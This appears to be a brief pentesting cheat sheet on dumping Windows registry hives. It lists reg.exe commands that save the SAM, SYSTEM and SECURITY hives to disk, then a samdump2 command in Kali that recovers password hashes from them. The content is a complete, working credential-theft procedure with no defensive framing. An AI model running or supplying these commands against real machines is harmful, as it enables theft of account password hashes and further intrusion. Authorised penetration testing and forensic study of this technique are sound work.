# Dumping Windows Registry Files

## Extract SAM, SYSTEM, SECURITY Files
Run the following commands:
```bash
reg.exe save hklm\sam sam.sav
reg.exe save hklm\system system.sav
reg.exe save hklm\security security.sav
```

 - The files will be saved to your current working directory.


## Recover Hashes in Kali

Run the following command in the terminal:
```bash
samdump2 system.sav sam.sav
```